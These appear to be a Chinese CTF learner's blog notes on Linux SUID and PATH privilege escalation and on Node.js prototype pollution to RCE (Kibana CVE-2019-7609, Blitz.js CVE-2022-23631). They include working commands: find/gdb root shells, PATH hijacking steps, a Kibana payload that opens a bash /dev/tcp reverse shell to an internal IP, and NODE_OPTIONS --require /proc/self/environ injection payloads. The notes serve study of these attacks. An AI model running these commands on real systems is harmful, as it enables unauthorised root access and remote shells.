权限位应用于目录时，新创建的文件和子目录将自动继承该目录的所属组而不是创建者的组</li></ol></li></ol></li><li><p><em><strong>为什么需要suid？</strong></em></p><ol><li>例如用户想修改自己的密码，但是修改涉及到 &#x2F;etc&#x2F;shadow 文件，这个文件只有 root 权限才能修改，这时候 passwd 命令就设置了特殊权限，修改密码时临时使用了 root 的权限去修改 shadow 文件</li></ol></li><li><p><em><strong>如何进行设置</strong></em></p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s filename   <span class="comment">#设置SUID位</span></span><br><span class="line"><span class="built_in">chmod</span> u-s filename   <span class="comment">#去掉SUID设置</span></span><br><span class="line"><span class="built_in">chmod</span> 4750 file      <span class="comment"># 在4750中，4说明SUID位被设置，7为所有者读写执行权限</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="suid提权实战注意点"><a href="#suid提权实战注意点" class="headerlink" title="suid提权实战注意点"></a>suid提权实战注意点</h3><ol><li>步骤<ol><li>查找具备 suid 权限且属主是 root 的文件</li><li>查找对应文件的利用方法（不是所有文件均可利用，需要结合时间成本考虑是否进行利用）</li></ol></li><li>Set-UID (SUID) 权限位的用户不一定是 root。SUID 权限位可以使文件在执行时，其有效用户 ID (EUID) 变成文件所有者的用户 ID，而这个所有者可以是任何用户，不仅仅是 root –&gt; <strong>所以建议使用<code>-user root</code>选项来筛查</strong></li><li><strong>自动预警</strong>: <code>find / -perm -4000 2&gt; /dev/null</code>这类查找系统 suid 特殊权限的命令被各大 HIDS 系统列入检测范围，很容易被检测出来</li></ol><h3 id="suid提权实战"><a href="#suid提权实战" class="headerlink" title="*suid提权实战"></a>*suid提权实战</h3><blockquote><p>真题可见PyBlockly_强网24</p></blockquote><ol><li><p>先查查文件</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 直接查找</span></span><br><span class="line">   <span class="comment"># 建议-user root，之后还要 ls -al 进一步查看是否当前用户可以执行</span></span><br><span class="line">   find ／ ﹣user root ﹣perm ﹣4000</span><br><span class="line">       <span class="comment"># -user root：查找属于 root 用户的文件。</span></span><br><span class="line">       <span class="comment"># -perm -4000：查找具有 SUID 权限位的文件。-4000 表示文件的权限位中包含 SUID 位。如果是 4000 则是指准确位4000的权限位。+4000 现在可以先不管</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null</span><br><span class="line">   find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 一套带走</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null | <span class="keyword">while</span> <span class="built_in">read</span> file; <span class="keyword">do</span> <span class="built_in">ls</span> -l <span class="string">&quot;<span class="variable">$file</span>&quot;</span>; <span class="keyword">done</span></span><br><span class="line">      <span class="comment"># 无法直接 find / -perm -4000 2&gt; /dev/null | ls -l，原因是 ls -l 期望接收的是文件名参数，而不是标准输入。find 命令的输出通过管道传递给 ls -l，但 ls -l 并不会从标准输入读取文件名，而是将整个输入视为一个字符串</span></span><br><span class="line">      <span class="comment"># find 也会查找隐藏文件</span></span><br><span class="line">   find / -perm -4000 2&gt; /dev/null | xargs <span class="built_in">ls</span> -l</span><br><span class="line">   find / -perm -4000 -print0 2&gt; /dev/null | xargs -0 <span class="built_in">ls</span> -l</span><br><span class="line">      <span class="comment"># 需要 xargs，但是没有试成功，应该是一次性输出这样的，文件少可以马上</span></span><br><span class="line">   find / -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">      <span class="comment"># -exec command &#123;&#125; \;</span></span><br><span class="line">      <span class="comment"># &#123;&#125;：一个占位符，表示 find 命令找到的每个文件。</span></span><br><span class="line">      <span class="comment"># \;：表示 -exec 选项的结束。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>通过语言运行开shell</strong>，如使用gdb进行命令执行(新开一个有root的shell): <code>gdb -nx -ex &#39;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#39; -ex quit</code></p></li><li><p><strong>文件处理</strong>，如dd处理磁盘相关可以用来复制文件等，PyBlockly_强网24中就有用: <code>dd if=/flag of=/tmp/flag</code></p></li><li><p><strong>命令附加执行</strong>，如find有那么直接用find -exec，一个思路</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find ./already_existed -<span class="built_in">exec</span> /bin/sh -p \;</span><br><span class="line">find /usr/bin/su -<span class="built_in">exec</span> /bin/bash -p \; -quit    <span class="comment"># 利用find得到一个root权限的shell，su是具有suid权限的file</span></span><br><span class="line">find / -<span class="built_in">exec</span> /bin/sh -p \;  <span class="comment"># 一样可得到一个root权限的shell</span></span><br><span class="line"></span><br><span class="line">find /usr/bin/su -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure></li></ol><h2 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h2><blockquote><p>环境变量的提权立足于suid提权上，思想是suid的思想，只是利用了环境变量的特性，牢记目的是要提权</p></blockquote><h3 id="环境变量ref"><a href="#环境变量ref" class="headerlink" title="*环境变量ref"></a>*环境变量ref</h3><ol><li><a href="https://www.freebuf.com/articles/system/320593.html">虽然不是很直观，但是慢慢看还是很细的，重要的是参考资料很好</a></li><li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">一些示例</a><ol><li>出现<code>system(&#39;cat /file.txt&#39;)</code>这种时竟然不用管闭合，只需要直接<code>echo &#39;/bin/sh&#39; &gt; cat</code>就ok</li></ol></li><li><a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">这篇的环境变量提权部分</a><ol><li><em><strong>有修改环境变量的具体命令</strong></em></li></ol></li><li>**<a href="https://blog.csdn.net/weixin_39190897/article/details/135429139">p牛</a></li></ol><h3 id="什么是环境变量"><a href="#什么是环境变量" class="headerlink" title="什么是环境变量"></a>什么是环境变量</h3><ol><li><p>常见的环境变量: 可以看见$PATH只是环境变量中的一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PATH：定义了系统在查找可执行文件时搜索的目录列表。</span><br><span class="line">HOME：用户的家目录。</span><br><span class="line">USER：当前登录用户的用户名。</span><br><span class="line">LANG：设定用户界面的语言。</span><br><span class="line">SHELL：用户使用的 shell 程序。</span><br><span class="line">TERM：终端类型。</span><br><span class="line">PS1：bash shell 提示符格式。</span><br><span class="line">LD_LIBRARY_PATH：动态链接器搜索共享库的路径。</span><br><span class="line">LD_PRELOAD：指定在程序启动时预先加载的共享库</span><br></pre></td></tr></table></figure></li><li><p>相关文件</p><ol><li>兼容性：不同的 shell（如 bash、zsh）可能有不同的环境变量配置文件，这里是bash的</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2. 修改系统级环境变量：</span><br><span class="line">编辑 /etc/environment 文件。</span><br><span class="line">编辑 /etc/profile 文件。</span><br><span class="line">编辑 /etc/profile.d/ 目录下的脚本文件。</span><br><span class="line"></span><br><span class="line">3. 修改用户级环境变量：</span><br><span class="line">编辑 ~/.bashrc 文件。</span><br><span class="line">编辑 ~/.profile 文件。</span><br><span class="line">编辑 ~/.bash_profile 文件（适用于登录 shell）</span><br></pre></td></tr></table></figure></li></ol><h3 id="PATH的作用"><a href="#PATH的作用" class="headerlink" title="$PATH的作用"></a>$PATH的作用</h3><ol><li><em><strong>当执行一个命令时查找可执行文件的顺序</strong></em><ol><li>S1 解析命令: shell（如 Bash）会首先解析该命令。命令可以是内置命令、外部命令或脚本</li><li>S2 直接指定路径: shell直接查找执行</li><li>S3 内置命令直接执行</li><li>S4 $PATH变量查找: 如果命令不是内置命令，shell 会<strong>依次</strong>检查 PATH 环境变量。PATH 环境变量是一个由冒号（:）分隔的目录列表，指定了系统在查找可执行文件时搜索的目录顺序</li><li>S5 命令未找到: 如果在所有指定的目录中都没有找到匹配的文件，shell 会返回“命令未找到”的错误信息</li></ol></li><li>关于$PATH<ol><li><p><strong>典型的环境值</strong></p><ol><li>关于sbin: Sbin（Superuser Binary的缩写）这个目录也是用来存放二进制文件的，但它主要存放的是系统管理员使用的管理工具。例如，&#x2F;sbin目录下的命令通常需要超级用户权限才能执行</li></ol></li><li><p><strong>可以用.来设置动态当前目录</strong>，替代：需要临时在当前目录中运行可执行文件，可以使用 .&#x2F; 前缀</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/sbin：本地安装的系统管理命令。</span><br><span class="line">/usr/local/bin：本地安装的用户命令。</span><br><span class="line">/usr/sbin：系统管理命令。</span><br><span class="line">/usr/bin：用户命令。</span><br><span class="line">/sbin：基本系统管理命令，通常在启动和修复系统时使用。</span><br><span class="line">/bin：基本用户命令，通常在启动和修复系统时使用。</span><br><span class="line">   <span class="comment"># 超级用户的 PATH 通常包含 /sbin 和 /usr/sbin 和 /usr/local/sbin</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="利用原理与大大大前提"><a href="#利用原理与大大大前提" class="headerlink" title="利用原理与大大大前提"></a>利用原理与大大大前提</h3><ol><li>利用原理<ol><li>S1: 命名一个和这个系统命令相同的文件，写入&#x2F;bin&#x2F;bash, 再将存放这个文件的路径加入环境变量中(要在前面的位置)</li><li>S2: 当系统去执行这个带有系统命令的文件时，就会直接执行我们命名和这个系统命令相同的文件，而非真实的系统命令；从而实现劫持环境变量提权</li></ol></li><li>前提<ol><li>原有shell中运行的命令不是内置命令</li><li>系统中存在带有suid的文件，且这个文件中必须有系统命令</li><li>同时这个文件也应该符合suid提权利用要求在我们当前用户具有执行权限</li><li>可以修改环境变量并在首部添加</li></ol></li></ol><h3 id="PATH实战"><a href="#PATH实战" class="headerlink" title="*$PATH实战"></a>*$PATH实战</h3><ol><li><p>过一个流程</p><ol><li>记得赋予执行权限</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment"># suid部分不做流程，这里已知 /shell 执行 ps命令</span></span><br><span class="line"><span class="built_in">cd</span> /tmp </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; ps     或者   <span class="built_in">cp</span> /bin/sh /tmp/ps</span><br><span class="line"><span class="built_in">chmod</span> 777 ps</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span>  <span class="comment">#把tmp设置在环境变量头部让系统在执行ps命令的时候先检索到tmp目录下的ps</span></span><br><span class="line">ehco <span class="variable">$PATH</span>  <span class="comment">#检查是否成功把/tmp  设置在了环境变量的头部</span></span><br><span class="line">./shell  <span class="comment">#执行shell文件，触发我们劫持的ps命令（此时sysyem运行的ps这个命令是root权限），但是此时实际执行的是  /bin/sh   ，也就是相当于以root权限去执行/bin/sh从而实现提权</span></span><br></pre></td></tr></table></figure></li><li><p><strong>使用xxd&#x2F;运行(利用报错信息)查看shell参数</strong>: 我们会遇到一种情况是给定的shell文件是已经编译好的文件，此时可以使用xxd来获取参数<code>xxd /shell</code></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> all in one </tag>
            
            <tag> root </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Proxy_强网24</title>
      <link href="/2024/11/03/Proxy_%E5%BC%BA%E7%BD%9124/"/>
      <url>/2024/11/03/Proxy_%E5%BC%BA%E7%BD%9124/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ENV hacking</title>
      <link href="/2024/11/03/ENV%20hacking/"/>
      <url>/2024/11/03/ENV%20hacking/</url>
      
        <content type="html"><![CDATA[<h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li><a href="https://www.elttam.com/blog/env/">解释性语言中的环境变量渗透</a></li><li><a href="https://po6ix.github.io/Abusing-Environment-Variables/">po6ix</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> env </tag>
            
            <tag> all in one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FlaskS3c</title>
      <link href="/2024/11/03/FlaskS3c/"/>
      <url>/2024/11/03/FlaskS3c/</url>
      
        <content type="html"><![CDATA[<blockquote><p>可恶的强网，怎么都是flask，我还没学55</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> all in one </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pp2rce</title>
      <link href="/2024/11/02/pp2rce/"/>
      <url>/2024/11/02/pp2rce/</url>
      
        <content type="html"><![CDATA[<blockquote><p>感慨，ai现在真是强大，真的是概念解答神<br>这篇文章适用于参数固定不可控的pp2rce，这是一类源码上的漏洞</p></blockquote><h3 id="child-process-spawn-深入部分源码"><a href="#child-process-spawn-深入部分源码" class="headerlink" title="child_process.spawn()深入部分源码"></a>child_process.spawn()深入部分源码</h3><ol><li>REF<ol><li>说实话，这篇要先看RCE in Kibana才能懂一些(等涉及到了再来学)，我一开始是没有看懂<a href="https://c1oudfl0w0.github.io/blog/2024/10/11/PP2RCE/">很细但是太菜看不懂</a></li></ol></li><li>简单先说一下：child_process 内置的6个函数底层最终都会调用 spawn(<a href="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#child-process">详见</a>)，调用spawn后会进入子函数normalizeSpawnArguments，在该子函数中会对env变量进行赋值并会将最终的envPairs作为新进程中的环境变量存储在该进程的文件&#x2F;proc&#x2F;self&#x2F;environ中 –&gt; normalizeSpawnArguments实现中存在原型链污染的注入点(let key in中的in)</li><li>截取一些敏感的部分<ol><li><p>最终会使用execvp来执行任务<code>execvp(options-&gt;file, options-&gt;args);</code>这里的 options-&gt;file 就是我们最初传给spawn的参数。 比如我们的例子是，那么此时的file就是，当然对于有参数的命令，则 options-&gt;args 与之对应。<code>spawn(&#39;whoami&#39;)</code></p><ol><li>这里经过处理后已经不是一开始参数中的options了，具体源码还看不懂sad</li><li><em><strong>对于fork()有些许不同</strong></em></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">fork</span> = <span class="keyword">function</span>(<span class="params">modulePath <span class="comment">/*, args, options*/</span></span>) &#123;</span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">    options.<span class="property">execPath</span> = options.<span class="property">execPath</span> || process.<span class="property">execPath</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">spawn</span>(options.<span class="property">execPath</span>, args, options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>以下是normalizeSpawnArguments</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node早期版本</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalizeSpawnArguments</span>(<span class="params">file, args, options</span>) &#123;</span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">  <span class="keyword">if</span> (options === <span class="literal">undefined</span>)</span><br><span class="line">    options = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">  <span class="keyword">var</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line">  <span class="keyword">var</span> envPairs = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">    envPairs.<span class="title function_">push</span>(key + <span class="string">&#x27;=&#x27;</span> + env[key]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">_convertCustomFds</span>(options);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">file</span>: file,</span><br><span class="line">    <span class="attr">args</span>: args,</span><br><span class="line">    <span class="attr">options</span>: options,</span><br><span class="line">    <span class="attr">envPairs</span>: envPairs</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*node v18</span></span><br><span class="line"><span class="comment">  for (const key of envKeys) &#123;</span></span><br><span class="line"><span class="comment">    const value = env[key];</span></span><br><span class="line"><span class="comment">    if (value !== undefined) &#123;</span></span><br><span class="line"><span class="comment">        validateArgumentNullCheck(key, `options.env[&#x27;$&#123;key&#125;&#x27;]`);</span></span><br><span class="line"><span class="comment">        validateArgumentNullCheck(value, `options.env[&#x27;$&#123;key&#125;&#x27;]`);</span></span><br><span class="line"><span class="comment">        ArrayPrototypePush(envPairs, `$&#123;key&#125;=$&#123;value&#125;`);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="RCE-via-env"><a href="#RCE-via-env" class="headerlink" title="RCE via env &lt;- *RCE in Kibana (CVE-2019-7609)"></a>RCE via env &lt;- *RCE in Kibana (CVE-2019-7609)</h3><h4 id="深入理解-proc-self-environ"><a href="#深入理解-proc-self-environ" class="headerlink" title="深入理解&#x2F;proc&#x2F;self&#x2F;environ"></a>深入理解&#x2F;proc&#x2F;self&#x2F;environ</h4><ol><li><p>类似的敏感文件</p> <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/environ 当前进程的环境变量</span><br><span class="line">/proc/self/cwd 当前进程运行的目录环境</span><br><span class="line">/proc/self/cmdline 文件查看当前进行进程执行命令</span><br><span class="line">/proc/[pid]/fd 当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</span><br><span class="line">/proc/net/fib_trie、/proc/net/arp、/proc/net/route 内网探测</span><br><span class="line">/sys/class/net/eth0/address mac地址</span><br></pre></td></tr></table></figure></li><li><p><em><strong>进程</strong></em>: 进程（Process）是计算机操作系统中一个重要的概念，它是程序的一次执行过程，是系统进行资源分配和调度的基本单位。每个进程都有一个唯一的标识符，称为进程ID（PID）。进程不仅包含程序的指令集，还包括程序执行时所需的资源</p><ol><li>每个进程都有自己独立的地址空间，一个进程的内存与其他进程的内存是隔离的 –&gt; 子进程是独立的，有自己的内存空间和资源。父进程的崩溃不会直接影响子进程，反之亦然</li></ol></li><li><p><em><strong>每个进程共享一个&#x2F;proc&#x2F;self&#x2F;environ?</strong></em></p><ol><li>不同进程的 &#x2F;proc&#x2F;self&#x2F;environ 文件是不同的！但是每个独立的进程并不会拥有自己独立的文件系统。相反，所有进程共享同一个全局文件系统</li><li>这是通过 Linux 内核的命名空间（namespaces）和虚拟文件系统（VFS）机制实现的。尽管所有进程共享同一个全局文件系统，但每个进程的 &#x2F;proc&#x2F;self&#x2F;environ 文件实际上是一个<strong>虚拟文件</strong>(符号链接)，由内核动态生成，反映了该进程的环境变量</li></ol></li></ol><h4 id="payloads和核心思想"><a href="#payloads和核心思想" class="headerlink" title="payloads和核心思想"></a>payloads和核心思想</h4><blockquote><p>注意下最后payload两种形式都可以</p></blockquote><ol><li>REF<ol><li>写的很是清晰易懂<a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">原文</a> –&gt; 部分内容写在上面了</li><li><a href="https://cloud.tencent.com/developer/article/1533939">这篇解析也挺好的，跟着思考</a></li></ol></li><li>要求<ol><li>需要有可以操控的文件如这里的&#x2F;proc&#x2F;self&#x2F;environ</li><li>&#x2F;proc&#x2F;self&#x2F;environ中注入的环境变量应该位于首行</li></ol></li><li>提炼一下并思考一下我的问题<ol><li><em><strong>这里的核心思想</strong></em>是通过env变量的原型链污染来实现控制新进程的环境变量，并通过特殊的参数NODE_OPTIONS“包含js文件”并执行代码</li><li><em><strong>Q DONE: NODE_OPTIONS是如何发挥作用的呢？</strong></em><ol><li>A: 这里也是通过环境变量进行设置的，其实可以从<a href="https://nodejs.org/api/cli.html#node_optionsoptions">官方文档</a>推断出来的，这里允许的<code>NODE_OPTIONS=&#39;--require &quot;./file.js&quot;&#39; node</code>实质上是添加了环境变量，分开来使用<code>export NODE_OPTIONS</code>也是可以的 –&gt; 也可以<strong>问gpt bro</strong></li></ol></li><li>这里通过在env中设置环境新的环境变量<code>AAA=console.log(123)//</code>来做poc，js文件时将后续进行注释</li><li>Q DONE: 如何使得&#x2F;proc&#x2F;self&#x2F;environ文件的开头是就是我们想要执行的语句？<ol><li>A: 通过字典排序？注意到&#x3D;表达式本身就是一个合法的js语言，这里其实不一定(因为一开始的for in读取的是键，在js对象中的键大部分按照插入顺序来的)</li></ol></li><li>Q DONE: 这里不是js文件也可以执行js代码吗？<ol><li>A: 难道和php一样？笑死，给忘记了，在node中require()本来就不用加上文件尾部，默认为js解析 –&gt; <strong>所以可能有和php一样的文件包含漏洞</strong></li></ol></li></ol></li><li>payload<ol><li><p>Notice</p><ol><li>由于js不是编译型语言(包括nodejs)，所以注释其实不是必须的，只要有执行到命令那一行就好</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bash</span></span><br><span class="line"><span class="variable constant_">NODE_OPTIONS</span>=<span class="string">&#x27;--require file&#x27;</span> node</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>());odivnafadnvoa</span><br><span class="line">  <span class="comment">// 会在运行同步命令后才报错</span></span><br></pre></td></tr></table></figure></li><li><p>final paylaod</p><ol><li><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//&#39;).props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></li><li><strong>NODE_OPTIONS也可以不写在里面.env里面，可以确保要执行的命令在第一行，HackTricks中说的(其实也还好，可能是字典顺序&#x2F;插入顺序等，只有一个当然更好)</strong> –&gt; 这就是原型链污染的魅力</li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">USERINPUT</span> = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/environ&quot;, &quot;env&quot;: &#123; &quot;EVIL&quot;:&quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce\\\&quot;).toString())//&quot;&#125;&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如何理解</span></span><br><span class="line">a=&#123;&#125;  <span class="comment">// [[Pro..]]==Object</span></span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>=&#123;&#125;</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">AAA</span>=<span class="string">&quot;console.log(123)&quot;</span></span><br><span class="line">a</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span>=<span class="string">&#x27;--require hello&#x27;</span></span><br><span class="line">a</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">NODE_OPTIONS</span>  <span class="comment">// 输出--require hello</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(a.<span class="property">__proto__</span>.<span class="property">env</span>)  <span class="comment">// 输出[&#x27;AAA&#x27;, &#x27;NODE_OPTIONS&#x27;]</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="RCE-via-cmdline"><a href="#RCE-via-cmdline" class="headerlink" title="RCE via cmdline &lt;- *Blitz.js RPC suprjson(CVE-2022-23631) simple gothrough"></a>RCE via cmdline &lt;- *Blitz.js RPC suprjson(CVE-2022-23631) simple gothrough</h3><h4 id="分析一下源码"><a href="#分析一下源码" class="headerlink" title="分析一下源码"></a>分析一下源码</h4><ol><li><p>ref</p><ol><li><a href="https://www.sonarsource.com/blog/blitzjs-prototype-pollution/">cve-2022-23631</a>但是这篇也只是介绍</li></ol></li><li><p>相关信息：已在 superjson 1.8.1 和 Blitz.js 0.45.3 中修复</p></li><li><p><em><strong>从源码看漏洞原理</strong></em></p><ol><li><a href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L429">github argv0与shell源码</a>，这里适用原型污染会使得有shell(L456)<a href="https://po6ix.github.io/Abusing-Environment-Variables/">这篇里也有说明</a>和argv0(L477)并会被识别 -&gt; <strong>这里其实也不需要很了解，只要了解有传入和没有传入的差别就好，通过原型链勿扰构造有传入的情况</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最终执行belike???这里的在原文章 https://c1oudfl0w0.github.io/blog/2024/10/11/PP2RCE/#via-env-vars-cmdline 中实验也可以不改shell，我感觉的具体原因应该看看 深入理解shell这里</span></span><br><span class="line"><span class="title function_">execve</span>(<span class="string">&quot;/proc/self/exe&quot;</span>, [<span class="string">&quot;console.log(&#x27;pwned!&#x27;);//&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;node …&quot;</span>], &#123; <span class="attr">NODE_OPTIONS</span>: <span class="string">&quot;--require /proc/self/cmdline&quot;</span> &#125;)</span><br></pre></td></tr></table></figure></li></ol><h4 id="深入理解argv0"><a href="#深入理解argv0" class="headerlink" title="深入理解argv0"></a>深入理解argv0</h4><blockquote><p>怎么感觉node的官方文档写得很简略呢，还是要实验和ai一下</p></blockquote><ol><li>解析一下argv数组<ol><li>argv数组是在可执行文件命令已经解析并确定要执行的可执行文件之后传递给该可执行文件的，<strong>修改其中的argv[0]并不会影响到确定要执行的可执行文件</strong>，但是但是<strong>修改argv[1]等元素可以显著影响程序的行为，因为在具体实现中会作为配置项</strong></li><li>但argv[0]还是会有影响：某些程序的具体实现会根据 argv[0] 的值来决定执行不同的功能</li></ol></li><li>Q: child_process spawn下argv0的作用？<ol><li>注意到官方文档中的一句话: Node.js 在启动时会用 process.execPath 覆盖 argv[0]，因此 Node.js 子进程中的 process.argv[0] 不会匹配从父进程传给 spawn 的 argv0 参数。改为使用 process.argv0 属性检索它 –&gt; <strong>argv[0]和argv是不同的</strong><ol><li><a 